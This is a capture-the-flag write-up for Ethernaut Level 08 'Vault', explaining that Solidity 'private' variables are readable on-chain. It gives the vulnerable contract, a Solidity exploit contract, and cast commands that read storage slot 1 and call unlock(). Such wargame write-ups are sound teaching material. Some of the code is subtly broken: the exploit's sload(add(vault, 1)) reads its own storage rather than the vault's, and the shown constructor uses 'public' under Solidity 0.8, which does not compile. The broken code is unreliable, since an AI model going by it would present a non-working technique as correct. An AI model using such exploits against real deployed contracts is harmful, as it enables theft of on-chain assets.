# Ethernaut Level 08: Vault

**Objective:** Unlock the vault by reading the private password from storage.

**Key Insight:** `private` in Solidity only hides from other contracts, not from anyone reading storage directly.

---

## The Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) public {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

---

## The Vulnerability

1. `password` is marked `private` — but this is **not encryption**
2. All contract storage is publicly readable on-chain
3. `password` is stored at storage slot 1 (slot 0 is `locked`)

---

## Exploit Strategy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract VaultExploit {
    // No contract needed — just use cast or web3.js
    // But here's how to do it programmatically:
    
    function readPassword(address vault) public view returns (bytes32) {
        // Read storage slot 1 directly
        bytes32 password;
        assembly {
            password := sload(add(vault, 1))
        }
        return password;
    }
}
```

**Actually simpler with cast:**
```bash
cast storage <VAULT_ADDRESS> 1 --rpc-url <RPC_URL>
```

Then:
```bash
cast send <VAULT_ADDRESS> "unlock(bytes32)" <PASSWORD> --private-key <KEY>
```

---

## Attack Steps

1. **Read storage slot 1** where password lives
2. **Call unlock()** with the retrieved password
3. **Verify** `locked` is now false

---

## Key Learning

> "Private" in Solidity is like writing a secret on a glass wall — 
> you can't see it from the other side, but anyone can walk around and look.

**Real-world impact:** Storing sensitive data on-chain is always visible. Use commitment schemes (hashes) or off-chain storage for secrets.

---

## Testnet Deployment

- **Network:** Sepolia
- **Contract:** TBD
- **Status:** Exploit ready
- **TX Hash:** TBD

---

## Related

- Level 07: Force (selfdestruct)
- Level 09: King (DOS via revert)
